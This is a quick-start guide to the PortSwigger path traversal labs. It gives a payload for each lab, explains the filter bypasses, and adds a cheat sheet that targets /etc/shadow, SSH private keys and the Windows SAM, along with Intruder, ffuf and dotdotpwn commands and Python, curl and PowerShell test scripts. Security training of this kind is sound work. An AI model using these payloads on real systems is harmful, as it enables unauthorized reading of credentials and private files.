# Path Traversal - Quick Start Guide

**Complete all 6 PortSwigger labs in 15 minutes with this rapid exploitation guide.**

---

## Quick Reference

| Lab | Payload | Time | Difficulty |
|-----|---------|------|------------|
| 1. Simple Case | `../../../etc/passwd` | 1 min | Apprentice |
| 2. Absolute Path | `/etc/passwd` | 1 min | Apprentice |
| 3. Non-Recursive Strip | `....//....//....//....//....//etc/passwd` | 2 min | Practitioner |
| 4. URL-Decode | `..%252f..%252f..%252fetc/passwd` | 2 min | Practitioner |
| 5. Path Start Validation | `/var/www/images/../../../etc/passwd` | 3 min | Practitioner |
| 6. Null Byte | `../../../../etc/passwd%00.png` | 2 min | Practitioner |

**Total Time:** ~11-15 minutes for all labs

---

## Setup (1 minute)

### Burp Suite Configuration

1. Start Burp Suite
2. Configure browser proxy: `127.0.0.1:8080`
3. Open Burp → Proxy → HTTP history
4. Access the lab URL
5. Browse to any product page

---

## Lab 1: Simple Case (1 minute)

**Objective:** Retrieve `/etc/passwd`

### Quick Steps

1. **Intercept:** Click any product image
2. **Locate:** Find request:
   ```http
   GET /image?filename=XX.png
   ```
3. **Modify:** Change filename to:
   ```
   ../../../etc/passwd
   ```
4. **Send:** Forward or use Repeater
5. **Verify:** Response contains `root:x:0:0:root`

**Done!** ✅

### Troubleshooting

- **404 Error:** Add more `../` sequences
- **No response:** Check you're modifying the right parameter
- **Access denied:** Wrong lab, this one has no protections

---

## Lab 2: Absolute Path Bypass (1 minute)

**Objective:** Bypass traversal sequence filter

### Quick Steps

1. **Test basic traversal:**
   ```
   ../../../etc/passwd
   ```
   Result: Blocked ❌

2. **Use absolute path:**
   ```
   /etc/passwd
   ```
   Result: Success ✅

**Done!** ✅

### Why It Works

Filter blocks `../` but allows absolute paths starting with `/`

---

## Lab 3: Non-Recursive Stripping (2 minutes)

**Objective:** Bypass single-pass filter

### Quick Steps

1. **Test basic traversal:**
   ```
   ../../../etc/passwd
   ```
   Result: Blocked ❌

2. **Test absolute path:**
   ```
   /etc/passwd
   ```
   Result: Blocked ❌

3. **Nested sequences:**
   ```
   ....//....//....//....//....//etc/passwd
   ```
   Result: Success ✅

**Done!** ✅

### Why It Works

Filter removes `../` once:
```
....// → ../ (after removing one ../)
```

### Alternative Payloads

```
..././..././..././..././..././etc/passwd
...//...//...//...//.....///etc/passwd
```

---

## Lab 4: Superfluous URL-Decode (2 minutes)

**Objective:** Bypass URL-decode based filter

### Quick Steps

1. **Test basic traversal:**
   ```
   ../../../etc/passwd
   ```
   Result: Blocked ❌

2. **Single encoding:**
   ```
   ..%2f..%2f..%2fetc/passwd
   ```
   Result: Blocked ❌

3. **Double encoding:**
   ```
   ..%252f..%252f..%252fetc/passwd
   ```
   Result: Success ✅

**Done!** ✅

### Why It Works

Application decodes twice:
```
Input:     ..%252f
Decode 1:  ..%2f (filter checks, no ../)
Decode 2:  ../   (application uses)
```

### Quick Encoding Reference

| Character | Single | Double |
|-----------|--------|--------|
| `/` | `%2f` | `%252f` |
| `\` | `%5c` | `%255c` |
| `.` | `%2e` | `%252e` |

**Full Payload:**
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

---

## Lab 5: Path Start Validation (3 minutes)

**Objective:** Bypass prefix validation

### Quick Steps

1. **Identify base path:**
   Look at normal image requests:
   ```http
   GET /image?filename=/var/www/images/1.jpg
   ```

2. **Test without prefix:**
   ```
   ../../../etc/passwd
   ```
   Result: Blocked ❌

3. **Include prefix + traverse:**
   ```
   /var/www/images/../../../etc/passwd
   ```
   Result: Success ✅

**Done!** ✅

### Why It Works

Filter checks path **starts with** `/var/www/images/` but doesn't verify final destination after resolving `../`

### Path Resolution

```
/var/www/images/../../../etc/passwd
→ /var/www/../../../etc/passwd
→ /var/../../../etc/passwd
→ /../../../etc/passwd
→ /etc/passwd ✅
```

### Common Prefixes

```
/var/www/images/
/opt/app/static/
/home/user/uploads/
C:\inetpub\wwwroot\images\
```

---

## Lab 6: Null Byte Bypass (2 minutes)

**Objective:** Bypass extension validation with null byte

### Quick Steps

1. **Test without extension:**
   ```
   ../../../../etc/passwd
   ```
   Result: Blocked (expects .png) ❌

2. **Test with extension:**
   ```
   ../../../../etc/passwd.png
   ```
   Result: File not found ❌

3. **Null byte injection:**
   ```
   ../../../../etc/passwd%00.png
   ```
   Result: Success ✅

**Done!** ✅

### Why It Works

Extension validation sees `.png`:
```python
"../../../../etc/passwd\x00.png".endswith('.png')
→ True ✅
```

Filesystem stops at null byte:
```c
open("../../../../etc/passwd\x00.png")
→ Opens: "../../../../etc/passwd" ✅
```

### Null Byte Encoding

```
%00        # Standard URL encoding
%2500      # Double encoding
\x00       # Hex notation
\0         # Escape sequence
```

### Alternative Payloads

```
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.gif
../../../../etc/passwd%2500.png (double-encoded)
```

---

## Speed Run Strategy

### Complete All 6 Labs in 15 Minutes

**Minute 0-1: Setup**
- Start Burp Suite
- Configure proxy
- Access first lab

**Minute 1-2: Lab 1 (Simple)**
```
Payload: ../../../etc/passwd
```

**Minute 2-3: Lab 2 (Absolute)**
```
Payload: /etc/passwd
```

**Minute 3-5: Lab 3 (Non-Recursive)**
```
Payload: ....//....//....//....//....//etc/passwd
```

**Minute 5-7: Lab 4 (URL-Decode)**
```
Payload: ..%252f..%252f..%252fetc/passwd
```

**Minute 7-10: Lab 5 (Path Start)**
```
Payload: /var/www/images/../../../etc/passwd
```

**Minute 10-12: Lab 6 (Null Byte)**
```
Payload: ../../../../etc/passwd%00.png
```

**Minute 12-15: Verification**
- Review all completed labs
- Take screenshots if needed

---

## Burp Suite Power Tips

### Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Forward request | `Ctrl+F` |
| Drop request | `Ctrl+D` |
| Send request in Repeater | `Ctrl+Space` |

### Repeater Workflow

1. **Capture request:** Intercept image load
2. **Send to Repeater:** Right-click → Send to Repeater
3. **Test payloads:** Modify filename parameter
4. **Quick testing:** Use Ctrl+Space to send
5. **Compare responses:** Use tabs for different attempts

### Intruder for Multiple Labs

**Position:**
```http
GET /image?filename=§PAYLOAD§ HTTP/2
```

**Payloads (Paste List):**
```
../../../etc/passwd
/etc/passwd
....//....//....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/images/../../../etc/passwd
../../../../etc/passwd%00.png
```

**Settings:**
- Attack type: Sniper
- Grep - Match: `root:x:0:0`
- Resource pool: 1 concurrent request

**Result:** Test all labs sequentially with one Intruder run

---

## Common Payloads Cheat Sheet

### Basic Traversal (Depth Testing)

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Linux Target Files

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/version
/proc/self/environ
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/.git/config
```

### Windows Target Files

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\windows\repair\sam
```

### Encoding Variations

```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
```

### Bypass Techniques

```
....//....//....//etc/passwd          # Non-recursive strip
..././..././..././etc/passwd          # Alternative nesting
/etc/passwd                           # Absolute path
/var/www/images/../../../etc/passwd   # Prefix validation
../../../../etc/passwd%00.png         # Null byte
..;/..;/..;/etc/passwd               # Nginx/Tomcat
```

---

## Troubleshooting Guide

### Issue: 404 Not Found

**Cause:** Not enough traversal depth
**Solution:** Add more `../` sequences

```
Try: ../../../../etc/passwd
Then: ../../../../../etc/passwd
Then: ../../../../../../etc/passwd
```

### Issue: 403 Forbidden

**Cause:** Filter blocking traversal sequences
**Solution:** Try bypass techniques

```
1. Absolute path: /etc/passwd
2. Encoding: ..%252f..%252f..%252fetc/passwd
3. Nesting: ....//....//....//etc/passwd
```

### Issue: No Response

**Cause:** Wrong parameter or endpoint
**Solution:** Verify you're modifying the correct parameter

```
Check: GET /image?filename=XX.png
Not: GET /static/XX.png (hardcoded path)
```

### Issue: Empty Response

**Cause:** File exists but is empty
**Solution:** Try a different target file

```
/etc/passwd    # Should have content
/etc/hostname  # Alternative
/proc/version  # Another option
```

### Issue: Extension Required Error

**Cause:** Application validates file extension
**Solution:** Use null byte bypass

```
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg
```

---

## Practice Workflow

### Beginner (30 minutes)

1. **Understand concepts** (5 min)
   - Read vulnerability descriptions
   - Understand directory traversal

2. **Lab 1-2** (10 min)
   - Basic exploitation
   - Absolute path bypass

3. **Lab 3-4** (10 min)
   - Filter bypass techniques
   - Encoding methods

4. **Lab 5-6** (5 min)
   - Advanced bypasses

### Intermediate (15 minutes)

1. **Quick review** (2 min)
   - Review payload list

2. **Complete labs 1-6** (10 min)
   - Use prepared payloads
   - Minimal troubleshooting

3. **Document findings** (3 min)

### Expert (10 minutes)

1. **Rapid exploitation** (8 min)
   - One payload per lab
   - No delays

2. **Verification** (2 min)
   - Confirm all completed

---

## Post-Lab Practice

### Try These Variations

**Different depths:**
```
Test how many ../ are needed in different scenarios
```

**Mixed techniques:**
```
/var/www/images/....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd%00.png
```

**Different encodings:**
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%c0%ae%c0%ae%c0%afetc/passwd
..%5c..%5c..%5cetc/passwd (Windows)
```

### Real-World Testing

**Bug Bounty Targets:**
- File upload/download features
- Document viewers
- Image galleries
- Template systems
- Export/import functionality

**Common Parameters:**
```
?file=
?filename=
?path=
?document=
?page=
?template=
?include=
?dir=
?folder=
?load=
```

### Automated Testing

**dotdotpwn:**
```bash
perl dotdotpwn.pl -m http -h target.com -x 80 -f /etc/passwd -k "root:" -d 8
```

**ffuf:**
```bash
ffuf -u https://target.com/image?filename=FUZZ -w path-traversal.txt -mr "root:x"
```

**Custom script:**
```python
import requests

payloads = [
    "../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
]

for payload in payloads:
    r = requests.get(f"https://target.com/image?filename={payload}")
    if "root:x" in r.text:
        print(f"[+] Vulnerable: {payload}")
```

---

## Next Steps

### Expand Your Skills

1. **Complete DOM-based vulnerabilities:** See `dom-xss-quickstart.md`
2. **Master SSRF attacks:** See `ssrf-quickstart.md`
3. **Learn XXE injection:** See `xxe-quickstart.md`
4. **Practice on HackTheBox/TryHackMe**
5. **Start bug bounty hunting**

### Additional Resources

- **PortSwigger Web Security Academy:** https://portswigger.net/web-security/file-path-traversal
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **HackerOne Disclosed Reports:** Search for "path traversal"

---

## Quick Command Reference

### Test with cURL

```bash
# Basic test
curl "https://target.com/image?filename=../../../etc/passwd"

# Encoded test
curl "https://target.com/image?filename=..%252f..%252f..%252fetc/passwd"

# With authentication
curl -H "Authorization: Bearer TOKEN" \
     "https://target.com/image?filename=/etc/passwd"

# Save response
curl "https://target.com/image?filename=../../../etc/passwd" -o passwd.txt
```

### Test with Python

```python
import requests

url = "https://target.com/image"
params = {"filename": "../../../etc/passwd"}

response = requests.get(url, params=params)

if "root:x" in response.text:
    print("[+] Vulnerable to path traversal!")
    print(response.text)
else:
    print("[-] Not vulnerable or blocked")
```

### Test with PowerShell

```powershell
# Basic test
Invoke-WebRequest -Uri "https://target.com/image?filename=../../../etc/passwd"

# Check for vulnerability
$response = Invoke-WebRequest -Uri "https://target.com/image?filename=../../../etc/passwd"
if ($response.Content -match "root:x") {
    Write-Host "[+] Vulnerable!" -ForegroundColor Green
}
```

---

**Quick Start Version:** 1.0
**Last Updated:** January 2026
**Estimated Completion Time:** 15 minutes all labs
